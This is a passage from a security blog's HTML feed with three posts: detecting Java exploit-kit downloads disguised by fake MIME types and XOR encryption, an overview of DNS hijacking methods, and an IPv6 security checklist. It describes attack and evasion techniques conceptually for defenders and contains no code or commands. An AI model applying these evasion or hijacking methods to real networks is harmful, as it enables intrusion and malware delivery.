&lt;a href=&quot;https://z6543.github.io/_img/java1.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;https://z6543.github.io/_img/java1.png&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
This is the .jar exploit. As you can see, there is no extension at all in the HTTP request (e.g., .jar). But what about the Mime-type in the response? It is video/QuickTime… But it is the jar exploit, with &lt;a href=&quot;https://www.virustotal.com/en/file/00dec95213cc2fc5f7acf7ca1c92ee8a3345710833c808c245070739398c3117/analysis/&quot; target=&quot;_blank&quot;&gt;detection of 2/49 on Virustotal&lt;/a&gt;. And, yes, I'm aware of the fact that Virustotal statistics are useless, and AV has other possibilities in the exploit chain to block the malware being dropped.&amp;nbsp;&lt;a href=&quot;https://twitter.com/zh4ck/status/414687643373293568/photo/1&quot; target=&quot;_blank&quot;&gt;Or not :)&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Two things can be flagged here as Java: the User-agent and the Mime-type in the request. I recommend checking for both. The User-agent can be reviewed via regular expressions, and if one matches, flag it as Java request.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;
Payload delivery&lt;/h2&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Although not closely related to the exploit, but the malware payload delivery is exciting as well. After successful exploitation, the exploit payload downloads the malware from the same site. In a standard web-security gateway, executables can be flagged and blocked for average users. Now look at the Neutrino exploit kit:&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
&lt;a href=&quot;https://z6543.github.io/_img/java2.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;341&quot; src=&quot;https://z6543.github.io/_img/java2.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
No executable extension (e.g., .exe, .dll), the response Mime-type is faked to audio/MPEG, and even the malware is XOR encrypted with a 4 character key (I let the exercise to the reader to guess the XOR key). Also if the web-security gateway looks for file headers to identify executables, it won't find it. The malware is decrypted only on the victim, where the AV might or might not find it. Although the User-agent here is Java again, be aware of the fact that at this stage, the User-agent can be faked by the exploit.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;
&lt;b&gt;Update 2013.01.02&lt;/b&gt;: I forgot to mention the case of &lt;b&gt;SSL interception&lt;/b&gt;. Although in an enterprise environment, it is a good idea to intercept SSL traffic (except on finance, webmail, healthcare, etc. sites) to hunt for malware (and block Java), if you don't do this, it is not a problem. There is again a &lt;a href=&quot;http://www.room362.com/blog/2013/2/27/blocking-java-exploits-malicious-signed-applets-and-0days.html&quot;&gt;misconception&lt;/a&gt; that the User-agent of the client browser is not visible in an SSL connection on the proxy (web security gateway). Below is a screenshot to disprove this statement. In case of a transparent proxy, yes, there might be no user-agent.&lt;br /&gt;
&lt;br /&gt;
&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
&lt;a href=&quot;https://z6543.github.io/_img/useragent.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;465&quot; src=&quot;https://z6543.github.io/_img/useragent.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;
Mobile devices&lt;/h2&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
If we white-list sites on the web-security gateway and block any other traffic when we see Java-based User-agent or content-type, we are right. Well, almost. As long as the client is in the enterprise… What you can do here is to enforce the mobile devices the use of VPN every time it is outside of the corporate network, and only connect it to the Internet through the corporate web-security gateway. I know this is still not a solution, but I can't think anything better at the moment. Leave a comment if you have a solution for this.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Now the only Java threat is that someone hacks one of the white-listed websites in a watering hole attack, and serves the java exploit from the same page. Not a likely attack, but possible for a real advanced threat.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;
Conclusion&lt;/h2&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
If you are a CISO (or has the same position), you should proactively block Java exploits. White-listing websites which require Java is not impossible. Not a lot of sites use Java applets nowadays anyways. I would say average users see Java applets more in an exploit than in a legit site...&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
You can flag Java traffic via User-agent regular expression, or content-type (in the request), or both. Special care needs to be taken on mobile devices, which leave the enterprise on a regular basis. Of course, you will need other protections too, because this is not a 100% solution.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
And if you are a plain home user, you can safely delete Java from your browser, or use a decent Internet Security Suite which can &lt;a href=&quot;http://www.av-comparatives.org/wp-content/uploads/2013/12/avc_prot_2013b_en.pdf&quot; target=&quot;_blank&quot;&gt;effectively block Java exploits&lt;/a&gt;.&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>DNSSEC, from an end-user perspective, part 1</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/dns/hijack/spoofing/dnssec/xx/2013/12/10/DNSSEC,-from-an-end-user-perspective,-part-1.html"/>
   <updated>2013-12-10T10:49:33+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/dns/hijack/spoofing/dnssec/xx/2013/12/10/DNSSEC,-from-an-end-user-perspective,-part-1</id>
   <content type="html">&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
We all know since at least 1990 that the DNS protocol is insecure. Yet DNS is still the basis of almost all Internet communication. The biggest problem with DNS is that a malicious attacker can redirect victims, where victims try to connect to, e.g. safesite.com, but instead of this, they relate to the attacker's website. There are a lot of different ways to achieve this attack.&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;
DNS cache poisoning the DNS server, &quot;Da Old way.&quot;&lt;/h2&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
The attacker forces the victim's DNS server to resolve a domain where the attacker is the authoritative name server, and the attacker sends additional information to the DNS server that he is also the authoritative name server for safesite.com. This information is cached and used later when the victim resolves safesite.com.&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
It is easy to protect against this attack, any decent DNS server should be able to protect against this attack by dropping this additional information from DNS responses.&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;
DNS cache poisoning, &quot;&lt;a href=&quot;http://www.iana.org/about/presentations/davies-viareggio-entropyvuln-081002.pdf&quot;&gt;Da Kaminsky way&lt;/a&gt;&quot;&lt;/h2&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
An attacker can initiate queries to the victim's DNS server, and in the meantime, &quot;flood&quot; the DNS server with fake responses. The server will accept the fake response if the following conditions are right:&amp;nbsp;&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;the DNS server receives the answers on the same IP as it expects (this is not an attack limitation),&amp;nbsp;&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;the DNS server receives the answer to his question (again not a limitation, an attacker knows what he wants to attack),&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;the random(?) port used to send the query matches the answer,&amp;nbsp;&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;the random(?) 16-bit(!) unique transaction number in the answer matches with the query.&lt;/li&gt;
&lt;/ul&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
If the last two are not random, an attacker can easily poison the server in a matter of seconds. Or if your DNS server is behind NAT, the NAT can remove the randomness :-O&lt;/div&gt;
&lt;ul&gt;&lt;ul&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
To protect yourself against this, you should randomize the source port and unique identifier better, and disable your DNS server as being an open recursive resolver.&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;
Rogue DNS server via malware&lt;/h2&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
This is pretty common in both banking trojans, adware, etc. The malware reconfigures the users configured DNS server to use a malicious one, either in the local OS settings or in the home router.&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
To protect against this: don't let malware in your environment ;)&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;
ISP hijack, for advertisement or spying purposes&lt;/h2&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
This is the worst of all. ISP's hijack non-existing domains, and display advertisements. And because they broke the RFC, it will break a lot of your applications. I bet ISPs still think about this as a good idea :(&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Sometimes the ISP hijacks your connection because the government wants to spy on your communication or divert it. Use &lt;a href=&quot;https://www.torproject.org/download/download.html.en#Warning&quot;&gt;TOR&lt;/a&gt; &lt;a href=&quot;http://security.stackexchange.com/a/43485&quot;&gt;wisely&lt;/a&gt; if you don't want to be a victim.&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;
Captive portals&lt;/h2&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Sometimes captive portals use DNS hijacking to redirect the users to the default login page. Although it breaks things, it is still better than the ISP solution, because it is only a problem at the beginning of the connection, and not permanently.&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;
Pentester hijacks DNS to test application via active man-in-the-middle&lt;/h2&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Although this is not malicious at all (developers might think otherwise), but a lot of application security tests (thick clients, mobile applications) can only be carried out via DNS spoofing. Application security testers can easily make this attack because they can place the host machine in a network segment where they can make an active man-in-the-middle attack and respond to DNS queries sooner as the official DNS server. Or simply set the DNS server to their own DNS server.&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;
Malicious attacker hijacks DNS via active MITM&lt;/h2&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
This is similar to the previous one, but the goal is different. Although an attacker with active man-in-the-middle position can attack the victim in 1000 different ways (like SMB relaying, capturing LM/NTLM network hashes, modifying clear-text traffics, etc...), DNS spoofing is one of them.&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;h2 style=&quot;text-align: justify;&quot;&gt;
Having access to the DNS admin panel and rewriting the IP&lt;/h2&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
I believe this is going to be a &lt;a href=&quot;http://www.zdnet.com/how-the-syrian-electronic-army-took-out-the-new-york-times-and-twitter-sites-7000019989/&quot;&gt;new trend&lt;/a&gt;. This attack is the most effective one, and the hardest to prevent. Usually, it is not the admin panel that is being hacked, instead an admin's password gets stolen, or the password reset is hacked.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
You, as a client, can do three things to protect against this attack:&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;ol&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Choose a decent provider and prey :)&lt;/li&gt;
&lt;li&gt;&lt;div style=&quot;text-align: justify;&quot;&gt;
Put a registry lock on your DNS settings (serverDeleteProhibited, serverTransferProhibited, and serverUpdateProhibited). Although this additional layer is good enough today, I bet some motivated attackers will be able to successfully attack this. The attacker only has to:&lt;/div&gt;
&lt;ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;know the phone number of the client, which will be called by the registrar&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;hijack the call (social engineering the phone company)&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;provide an individual security phrase (social engineering the client)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Or run your own DNS server (this is not a solution for everybody)&lt;/li&gt;
&lt;/ol&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;h2&gt;
Conclusion&amp;nbsp;&lt;/h2&gt;
Although almost all attacks can be mitigated one way or another, there was a desperate need to solve this DNS spoofing issue once and for all. And so it begins, DNSSEC has been developed.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
In &lt;a href=&quot;http://jumpespjump.blogspot.hu/2014/01/dnssec-from-end-user-perspective-part-2.html&quot;&gt;part 2, &lt;/a&gt;we are going to investigate DNSSEC, what you can expect from it, and what you can't.&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Secure IPv6 deployment checklist think twice, deploy once</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/checklist/ipv6/security/xx/2013/12/10/Secure-IPv6-deployment-checklist-think-twice,-deploy-once.html"/>
   <updated>2013-12-10T10:47:39+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/checklist/ipv6/security/xx/2013/12/10/Secure-IPv6-deployment-checklist-think-twice,-deploy-once</id>
   <content type="html">&lt;div style=&quot;text-align: justify;&quot;&gt;
Before deep-diving into IPv6, I'm going to summarize my views on IPv6:&lt;/div&gt;
&lt;ol&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Start now(!) to plan your IPv6 deployment - in case you have not done so.&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;IPv6 is the future! There is no other choice.&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;NAT is the root of all evil.&lt;/li&gt;
&lt;/ol&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
IPv6 is coming. We've heard this 10 years ago as well, but it is really coming now. If you live in Asia, you can see this in real life. If you live in Europe or the USA, you can feel the pain of triple NATed devices.&lt;/div&gt;
&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Deploying IPv6 is not a binary task, you can do it in small steps. Get a public IPv6 address space, assign IPv6 addresses to your servers (e-mail, web, DNS).&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Great, you are now ahead of the world!&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Now, what about clients who want to access IPv6 web or email? You are lucky if you use an IPv6 compatible web/email proxy because the clients can still stay on IPv4.&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Now, what about your clients/servers accessing IPv6 services on the Internet directly (without a proxy)?&lt;/div&gt;
&lt;ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;If your network supports IPv6, your clients can directly access IPv6 services.&amp;nbsp;&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;If your network does not support IPv6, clients can still use tunneling protocols, e.g. ISATAP for Windows clients.&lt;/li&gt;
&lt;/ul&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
This might sound easier than it is. But do you have the budget/people/management support to do this? &lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Anyways, before you deploy IPv6 in your corporate environment, you have to think about the security issues. The next list is far from comprehensive or complete. Beware, here be dragons!&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
It is a myth that IPv6 is more secure than IPv4. The only practical security addition in IPv6 is called IPSEC, and has been backported to IPv4 many years ago.&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Most networking people are not familiar with the new terms, best practices introduced with IPv6. It is important to educate the networking and security personnel about IPv6, and let them play with the technology.&lt;/div&gt;
&lt;ol&gt;
&lt;/ol&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
IPv6 can reintroduce basically all security vulnerabilities which has been mitigated in IPv4:&lt;/div&gt;
&lt;ol&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;If the vulnerability is not in the IP layer, the vulnerability will stay there. Although it sounds obvious, most people tend to forget this. Your MS08-067 vulnerability won't magically disappear if you use IPv6. OK, but you closed port 445 on the firewall. Oh crap, it is open on IPv6...&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;b&gt;Man-in-the-middle attacks:&lt;/b&gt; Organizations have already guarded themselves against ARP spoofing and DHCP server spoofing with mitigation techniques like DAI (Dynamic ARP Inspection) and DHCP snooping in the world of IPv4. The only thing which has been changed is the name of the attacks and defenses. Search for ICMPv6 attacks, and Neighbour Discovery attacks.&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;b&gt;Source routing:&lt;/b&gt; Source routed IPv4 packets have not been seen for a while bypassing firewalls, but &quot;luckily&quot; the IPv6 standard reintroduced source routing in IPv6, in the name of Type 0 Router Headers. You should check whether your OS/network equipment support Type 0 Router Headers. If you have time, play with Scapy to test it.&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;b&gt;Blocking ICMP:&lt;/b&gt; Let's face the truth: In order to effectively use IPv6, some ICMPv6 messages has to traverse through firewalls. Like it or not, you can't hide your clients anymore.&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;b&gt;Router advertisement:&lt;/b&gt; Let's play a game. Go into any network, and start broadcasting IPv6 router advertisement packets in the network. Guess what, the clients are going to connect to you, and you will be the default IPv6 gateway for the clients. If there is no web proxy configured on the client, this means all Google, Youtube and Facebook traffic will be routed through your box, because IPv6 is preferred over IPv4. This can be the next generation WPAD attack :) If you don't want to be vulnerable, better search for RAGuard or similar solutions.&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;b&gt;Translation/tunneling:&lt;/b&gt; If all your network equipment support&amp;nbsp;IPv6&amp;nbsp;and configured to use it, you are lucky, because your&amp;nbsp;clients can use native IPv6. Otherwise, your clients have to use 6to4/ISATAP/Teredo/NAT64 or whatever IPv6 translation/tunneling. Do you know these protocols? Do your security products know these protocols?&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;b&gt;Dual stack:&lt;/b&gt; Your clients have to use both IPv4 and IPv6 together for a while. Be aware of the additional operating costs of maintaining 2 network protocol parallel.&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;b&gt;Fragmentation:&lt;/b&gt; In the first era of IDS/IPS devices, one of the main bypassing technique was IPv4 fragmentation. Have you checked whether your current solutions (IPS/IDS) parse fragmented packets the same way as your protected assets?&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;The IPv4&amp;nbsp;implementations have been tested thoroughly, and not much implementation bug is left there. But IPv6 implementation bugs, there will be a lot from them. Most of the programmers still don't know the basics of secure coding practices.&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;b&gt;IPv6 evercookie:&lt;/b&gt; Now that your clients don't have the same NAT IP, they static IP can be used to track them online. Luckily Microsoft solved the issue with IPv6 privacy extension, so clients will use temporarily IPv6 addresses to communicate with the Internet. Great, now how do you know in your security logs, which IPv6 address is which client???&lt;/li&gt;
&lt;/ul&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Do your current security devices fully support IPv6? Have you tested this?&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;&lt;ul&gt;
&lt;/ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Hardware Firewall (with all dual-stack/translation/tunneling nightmare)&lt;/li&gt;
&lt;ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Do you block all outgoing UDP from the clients, especially 3544?&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Can you maintain rules for both IPv4 and IPv6?&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;If you remove an IPv4 rule, do you remove the same rule for IPv6?&lt;/span&gt;&lt;/li&gt;
&lt;ul&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Log collection, log analysis, correlation:&lt;/li&gt;
&lt;ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Do the logs contain IPv6 addresses?&amp;nbsp;&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Is it parsed by the SIEM application?&amp;nbsp;&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Do you know that the DHCP IPv4 address is the same asset (workstation) as the IPv6 address with a privacy extension?&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;IPS, IDS:&lt;/span&gt;&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;Can these applications monitor/block all kinds of IPv6 translation/tunneling protocols?&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;WAF:&lt;/li&gt;
&lt;ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Is your WAF IPv6&amp;nbsp;ready/aware?&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;What about fragmentation?&lt;/li&gt;
&lt;/ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;VPN:&lt;/li&gt;
&lt;ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Can your clients connect to IPv6 services through VPN?&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Is your IPv6 VPN firewall rule as restrictive as the IPv4 one?&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;If you remove a rule on IPv4, do you remove the same in IPv6?&lt;/li&gt;
&lt;/ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Software firewall:&lt;/li&gt;
&lt;ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Is your software firewall IPv6 ready/aware?&amp;nbsp;&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Does it understand all translation/tunneling protocols?&amp;nbsp;&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Does it filter incoming traffic to the Teredo interface?&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;/ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;AV/endpoint protection:&lt;/li&gt;
&lt;ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;Is your AV/endpoint protection IPv6&amp;nbsp;ready/aware?&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;What about files downloaded via IPv6, is it scanned the same way as IPv4?&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;DLP (if you are in the 1% who actually bought one and enrolled it in production):&lt;/span&gt;&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;Is your DLP IPv6&amp;nbsp;ready/aware?&amp;nbsp;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;text-align: justify;&quot;&gt;Can it monitor tunneled traffics?&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
And last but not least, the bad news: you are already using IPv6 if you have Windows7 notebooks leaving your company, not having access to the domain controller. Or have you checked your servers link-local IPv6 addresses recently? Do you have a Windows2008 cluster? It is using IPv6 already!&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
The good news? In the not so far future (I estimate 2050) you can turn off your last device with IPv4 address, and forget all the nightmare around NAT and dual-stack. Because remember: NAT is not a security feature. It never was.&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
Useful links:&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;a href=&quot;https://www.thc.org/thc-ipv6/&quot; target=&quot;_blank&quot;&gt;https://www.thc.org/thc-ipv6/&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;a href=&quot;https://www.usenix.org/legacy/events/lisa11/tech/slides/babiker.pdf&quot; target=&quot;_blank&quot;&gt;https://www.usenix.org/legacy/events/lisa11/tech/slides/babiker.pdf&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;a href=&quot;http://www.cisco.com/en/US/prod/collateral/iosswrel/ps6537/ps6554/ps6599/ps10800/white_paper_c11-629044.pdf&quot; target=&quot;_blank&quot;&gt;http://www.cisco.com/en/US/prod/collateral/iosswrel/ps6537/ps6554/ps6599/ps10800/white_paper_c11-629044.pdf&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;a href=&quot;http://www.cisco.com/web/about/security/security_services/ciag/documents/v6-v4-threats.pdf&quot; target=&quot;_blank&quot;&gt;http://www.cisco.com/web/about/security/security_services/ciag/documents/v6-v4-threats.pdf&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;a href=&quot;http://www.secdev.org/conf/IPv6_RH_security-csw07.pdf&quot; target=&quot;_blank&quot;&gt;http://www.secdev.org/conf/IPv6_RH_security-csw07.pdf&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: justify;&quot;&gt;
&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
</content>
 </entry>
 

</feed>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
